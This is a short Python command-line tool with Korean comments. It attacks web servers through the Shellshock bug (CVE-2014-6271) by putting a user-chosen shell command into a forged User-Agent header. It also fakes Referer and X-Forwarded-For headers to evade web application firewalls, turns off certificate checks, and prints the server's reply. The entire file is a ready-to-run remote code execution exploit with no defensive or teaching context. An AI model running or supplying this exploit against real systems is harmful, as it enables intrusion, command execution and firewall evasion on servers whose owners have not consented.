import requests
import argparse
import warnings

# SSL 경고 무시
warnings.simplefilter('ignore', category=UserWarning)

# HTTP 요청 헤더 변조 (WAF 우회)
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Referer": "https://google.com",
    "X-Forwarded-For": "127.0.0.1"
}

# CVE-2014-6271 Exploit (ShellShock)
def exploit_cve_2014_6271(target_url, cmd):
    try:
        print(f"[INFO] Target: {target_url}")
        print("[INFO] Attempting ShellShock Exploit...")

        # ShellShock Payload
        payload = f"() {{ :; }}; echo; echo; /bin/bash -c '{cmd}'"
        headers = HEADERS.copy()
        headers["User-Agent"] = payload

        # Sending the request
        response = requests.get(target_url, headers=headers, verify=False, timeout=10)

        print("[DEBUG] Response Headers:", response.headers)
        print("[DEBUG] Response Body:", response.text)

        if response.status_code == 200:
            print("[SUCCESS] CVE-2014-6271 Exploit sent successfully!")
            print("Server Response:")
            print(response.text)
        else:
            print(f"[FAIL] Exploit attempt failed. HTTP Status code: {response.status_code}")

    except requests.exceptions.RequestException as err:
        print(f"[ERROR] {err}")
        print("[FAIL] Exploit attempt failed.")

# 메인 함수
def main():
    parser = argparse.ArgumentParser(
        description="Apache ShellShock (CVE-2014-6271) RCE Exploit Tool",
        usage="python3 exploit.py --url <URL> --cmd <COMMAND>"
    )
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--cmd", required=True, help="Command to execute")

    args = parser.parse_args()

    exploit_cve_2014_6271(args.url, args.cmd)

if __name__ == "__main__":
    main()
